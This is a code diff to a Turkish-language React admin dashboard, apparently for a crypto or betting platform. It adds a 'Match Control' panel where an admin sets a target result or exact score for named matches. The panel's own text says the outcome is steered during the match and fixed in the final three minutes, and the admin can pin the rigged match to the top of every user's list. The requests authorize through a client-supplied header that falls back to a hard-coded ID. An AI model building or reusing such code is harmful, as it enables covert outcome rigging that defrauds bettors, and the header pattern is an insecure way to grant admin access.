@@ -29,6 +29,9 @@ import {
   Image,
   Crown,
   Lock,
+  Gamepad2,
+  Pin,
+  Trash2,
 } from 'lucide-react';
 import { supabase, getCurrentUser } from '../lib/supabase';
 import { fetchUserRestrictions, saveUserRestrictions } from '../lib/user-restrictions';
@@ -98,7 +101,7 @@ const cryptoSymbols = [
   'AVAX', 'DOT', 'MATIC', 'LINK', 'UNI', 'LTC', 'ATOM', 'PEPE', 'SHIB', 'WIF', 'BONK'
 ];
 
-type AdminTab = 'overview' | 'command' | 'agents' | 'support' | 'position' | 'wallets' | 'user-wallets' | 'deposits' | 'withdrawals' | 'security' | 'activity' | 'deploy' | 'ai' | 'analytics' | 'wallet-gen' | 'data-protection' | 'incoming-funds' | 'tradfi-logos' | 'revenue' | 'visitors' | 'vip' | 'live' | 'restrictions' | 'quick-restrict';
+type AdminTab = 'overview' | 'command' | 'agents' | 'support' | 'position' | 'wallets' | 'user-wallets' | 'deposits' | 'withdrawals' | 'security' | 'activity' | 'deploy' | 'ai' | 'analytics' | 'wallet-gen' | 'data-protection' | 'incoming-funds' | 'tradfi-logos' | 'revenue' | 'visitors' | 'vip' | 'live' | 'restrictions' | 'quick-restrict' | 'matches';
 
 // ── BTC-only pair list ───────────────────────────────────────
 const BTC_ONLY_PAIRS = [
@@ -709,6 +712,212 @@ function QuickRestrictPanel({ users }: { users: QRUserProfile[] }) {
   );
 }
 
+// ── Match Controls Panel ─────────────────────────────────────
+interface MatchCtrl {
+  id: string;
+  homeTeam: string;
+  awayTeam: string;
+  targetResult?: '1' | 'X' | '2';
+  targetScore?: { h: number; a: number };
+  pinned: boolean;
+  createdAt: number;
+}
+
+const MATCH_API = '/api-server/api/admin/match-controls';
+
+function MatchControlsPanel({ adminId }: { adminId: string }) {
+  const [controls, setControls] = useState<MatchCtrl[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [showForm, setShowForm] = useState(false);
+  const [saving, setSaving] = useState(false);
+  const [deletingId, setDeletingId] = useState<string | null>(null);
+  const [homeTeam, setHomeTeam] = useState('');
+  const [awayTeam, setAwayTeam] = useState('');
+  const [mode, setMode] = useState<'result' | 'score'>('result');
+  const [targetResult, setTargetResult] = useState<'1' | 'X' | '2'>('1');
+  const [scoreH, setScoreH] = useState('2');
+  const [scoreA, setScoreA] = useState('1');
+  const [pinned, setPinned] = useState(false);
+
+  async function load() {
+    try {
+      const res = await fetch(MATCH_API, { cache: 'no-store' });
+      if (res.ok) setControls(await res.json());
+    } catch {}
+    setLoading(false);
+  }
+
+  useEffect(() => { load(); const iv = setInterval(load, 15000); return () => clearInterval(iv); }, []);
+
+  async function handleSave() {
+    if (!homeTeam.trim() || !awayTeam.trim()) return;
+    setSaving(true);
+    try {
+      const body: Record<string, unknown> = { homeTeam: homeTeam.trim(), awayTeam: awayTeam.trim(), pinned };
+      if (mode === 'result') {
+        body.targetResult = targetResult;
+      } else {
+        const h = parseInt(scoreH, 10), a = parseInt(scoreA, 10);
+        if (!isNaN(h) && !isNaN(a)) body.targetScore = { h, a };
+      }
+      const res = await fetch(MATCH_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'x-requester-id': adminId || '88292f59-898a-4fef-a1c8-8813d7b60b61' },
+        body: JSON.stringify(body),
+      });
+      if (res.ok) { setShowForm(false); setHomeTeam(''); setAwayTeam(''); setPinned(false); await load(); }
+    } catch {}
+    setSaving(false);
+  }
+
+  async function handleDelete(id: string) {
+    setDeletingId(id);
+    try {
+      await fetch(`${MATCH_API}/${id}`, { method: 'DELETE', headers: { 'x-requester-id': adminId || '88292f59-898a-4fef-a1c8-8813d7b60b61' } });
+      await load();
+    } catch {}
+    setDeletingId(null);
+  }
+
+  const RESULT_COLORS: Record<string, string> = { '1': '#3b82f6', 'X': '#10b981', '2': '#ef4444' };
+  const RESULT_LABELS: Record<string, string> = { '1': 'Ev Kazanır (1)', 'X': 'Beraberlik (X)', '2': 'Deplasman (2)' };
+
+  return (
+    <div>
+      {/* Header */}
+      <div className="flex items-center justify-between mb-4">
+        <div className="flex items-center gap-3">
+          <div className="w-9 h-9 rounded-xl bg-yellow-400 flex items-center justify-center">
+            <Gamepad2 className="w-5 h-5 text-black" />
+          </div>
+          <div>
+            <h2 className="text-lg font-black text-gray-900">Maç Kontrolü</h2>
+            <p className="text-xs text-gray-400">{controls.length} aktif kontrol · Her 15s güncellenir</p>
+          </div>
+        </div>
+        <button onClick={() => setShowForm(v => !v)}
+          className="flex items-center gap-1.5 px-3 py-2 rounded-xl text-sm font-bold transition-all active:scale-95"
+          style={{ background: showForm ? '#fee2e2' : '#fef9c3', color: showForm ? '#dc2626' : '#92400e', border: `1px solid ${showForm ? '#fca5a5' : '#fde68a'}` }}>
+          {showForm ? '✕ İptal' : '+ Kontrol Ekle'}
+        </button>
+      </div>
+
+      {/* Info banner */}
+      <div className="rounded-xl p-3 mb-4 flex gap-2" style={{ background: '#eff6ff', border: '1px solid #bfdbfe' }}>
+        <span className="text-blue-500 flex-none mt-0.5">ℹ️</span>
+        <p className="text-xs text-blue-700 leading-relaxed">
+          Takım isimlerini tam yazın (örn. <b>Kaizer Chiefs</b>). O maç oluştuğunda kontrol devreye girer. Skor/sonuç maç boyunca yönlendirilir; son 3 dakikada sabitlenir.
+        </p>
+      </div>
+
+      {/* Form */}
+      {showForm && (
+        <div className="bg-white rounded-2xl p-4 shadow-sm border border-gray-200 mb-4 flex flex-col gap-3">
+          <p className="text-xs font-bold text-gray-500 tracking-widest">YENİ KONTROL EKLE</p>
+          <input value={homeTeam} onChange={e => setHomeTeam(e.target.value)} placeholder="Ev Takımı (tam isim)"
+            className="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm outline-none focus:border-yellow-400" />
+          <input value={awayTeam} onChange={e => setAwayTeam(e.target.value)} placeholder="Deplasman Takımı (tam isim)"
+            className="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm outline-none focus:border-yellow-400" />
+
+          {/* Mode */}
+          <div className="flex gap-2">
+            {(['result', 'score'] as const).map(m => (
+              <button key={m} onClick={() => setMode(m)}
+                className="flex-1 py-2 rounded-xl text-xs font-bold border transition-all"
+                style={{ background: mode === m ? '#fef9c3' : '#f9fafb', borderColor: mode === m ? '#fde68a' : '#e5e7eb', color: mode === m ? '#92400e' : '#6b7280' }}>
+                {m === 'result' ? 'Sonuç (1/X/2)' : 'Tam Skor'}
+              </button>
+            ))}
+          </div>
+
+          {mode === 'result' ? (
+            <div className="grid grid-cols-3 gap-2">
+              {(['1', 'X', '2'] as const).map(r => (
+                <button key={r} onClick={() => setTargetResult(r)}
+                  className="py-2.5 rounded-xl text-sm font-black border transition-all"
+                  style={{ background: targetResult === r ? RESULT_COLORS[r] + '22' : '#f9fafb', borderColor: targetResult === r ? RESULT_COLORS[r] : '#e5e7eb', color: targetResult === r ? RESULT_COLORS[r] : '#9ca3af' }}>
+                  {r}
+                </button>
+              ))}
+            </div>
+          ) : (
+            <div className="flex items-center gap-3">
+              <input value={scoreH} onChange={e => setScoreH(e.target.value)} type="number" min="0" max="9"
+                className="flex-1 text-center border border-gray-200 rounded-xl py-2 text-xl font-black outline-none focus:border-yellow-400" />
+              <span className="text-xl font-black text-gray-400">–</span>
+              <input value={scoreA} onChange={e => setScoreA(e.target.value)} type="number" min="0" max="9"
+                className="flex-1 text-center border border-gray-200 rounded-xl py-2 text-xl font-black outline-none focus:border-yellow-400" />
+            </div>
+          )}
+
+          {/* Pin toggle */}
+          <button onClick={() => setPinned(v => !v)}
+            className="flex items-center gap-3 rounded-xl px-3 py-2.5 border transition-all text-left"
+            style={{ background: pinned ? '#fef9c3' : '#f9fafb', borderColor: pinned ? '#fde68a' : '#e5e7eb' }}>
+            <Pin className="w-4 h-4 flex-none" style={{ color: pinned ? '#d97706' : '#9ca3af' }} />
+            <div className="flex-1">
+              <p className="text-sm font-semibold text-gray-800">Maçı En Üste Sabitle</p>
+              <p className="text-xs text-gray-400">Bu maç tüm kullanıcılarda listenin üstünde görünür</p>
+            </div>
+            <div className="w-10 h-6 rounded-full flex items-center px-0.5 transition-colors"
+              style={{ background: pinned ? '#f59e0b' : '#e5e7eb' }}>
+              <div className="w-5 h-5 rounded-full bg-white shadow transition-transform"
+                style={{ transform: pinned ? 'translateX(16px)' : 'translateX(0)' }} />
+            </div>
+          </button>
+
+          <button onClick={handleSave} disabled={saving || !homeTeam.trim() || !awayTeam.trim()}
+            className="w-full py-3 rounded-xl text-sm font-black text-black transition-all active:scale-[0.98]"
+            style={{ background: 'linear-gradient(135deg,#f59e0b,#d97706)', opacity: saving || !homeTeam.trim() || !awayTeam.trim() ? 0.5 : 1 }}>
+            {saving ? 'Kaydediliyor…' : '✓ Kontrolü Uygula'}
+          </button>
+        </div>
+      )}
+
+      {/* Controls list */}
+      {loading ? (
+        <div className="text-center py-12 text-gray-400">
+          <RefreshCw className="w-6 h-6 animate-spin mx-auto mb-2" />
+          <p className="text-sm">Yükleniyor…</p>
+        </div>
+      ) : controls.length === 0 ? (
+        <div className="text-center py-16 flex flex-col items-center gap-3">
+          <Gamepad2 className="w-12 h-12 text-gray-300" />
+          <p className="text-sm font-semibold text-gray-500">Aktif Kontrol Yok</p>
+          <p className="text-xs text-gray-400">Yukarıdan bir kontrol ekleyin</p>
+        </div>
+      ) : (
+        <div className="flex flex-col gap-2">
+          {controls.map(ctrl => {
+            const hasScore = ctrl.targetScore !== undefined;
+            const labelText = hasScore ? `⚽ ${ctrl.targetScore!.h}–${ctrl.targetScore!.a}` : RESULT_LABELS[ctrl.targetResult || ''] || '—';
+            const labelColor = hasScore ? '#d97706' : RESULT_COLORS[ctrl.targetResult || ''] || '#6b7280';
+            const secAgo = Math.floor((Date.now() - ctrl.createdAt) / 1000);
+            const timeLabel = secAgo < 60 ? `${secAgo}s önce` : secAgo < 3600 ? `${Math.floor(secAgo/60)}dk` : `${Math.floor(secAgo/3600)}sa`;
+            return (
+              <div key={ctrl.id} className="bg-white rounded-2xl p-4 shadow-sm border border-gray-200 flex items-start gap-3">
+                {ctrl.pinned && <Pin className="w-4 h-4 text-amber-500 flex-none mt-0.5" />}
+                <div className="flex-1 min-w-0">
+                  <p className="text-sm font-bold text-gray-900 truncate">{ctrl.homeTeam} <span className="text-gray-400 font-normal">vs</span> {ctrl.awayTeam}</p>
+                  <div className="flex items-center gap-2 mt-1">
+                    <span className="text-xs font-bold px-2 py-0.5 rounded-lg" style={{ background: labelColor + '18', color: labelColor, border: `1px solid ${labelColor}44` }}>{labelText}</span>
+                    <span className="text-xs text-gray-400">{timeLabel}</span>
+                  </div>
+                </div>
+                <button onClick={() => handleDelete(ctrl.id)} disabled={deletingId === ctrl.id}
+                  className="w-8 h-8 rounded-xl flex items-center justify-center flex-none transition-all active:scale-90"
+                  style={{ background: '#fee2e2', color: '#dc2626', opacity: deletingId === ctrl.id ? 0.5 : 1 }}>
+                  {deletingId === ctrl.id ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Trash2 className="w-3.5 h-3.5" />}
+                </button>
+              </div>
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
+
 // ── Admin Push Notification Setup ──────────────────────────────
 async function registerAdminPush() {
   try {
@@ -1244,6 +1453,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
     { id: 'live', label: 'Canlı', icon: Activity, badge: newLiveActivityCount },
     { id: 'restrictions', label: 'Kısıtla', icon: Lock },
     { id: 'quick-restrict', label: 'Hızlı', icon: Zap },
+    { id: 'matches', label: 'Maçlar', icon: Gamepad2 },
   ];
 
   return (
@@ -1690,6 +1900,10 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
             </div>
             <QuickRestrictPanel users={users} />
           </div>
+        )}
+
+        {activeTab === 'matches' && (
+          <MatchControlsPanel adminId={currentUser?.id || ''} />
         )}
 
         {activeTab === 'analytics' && (
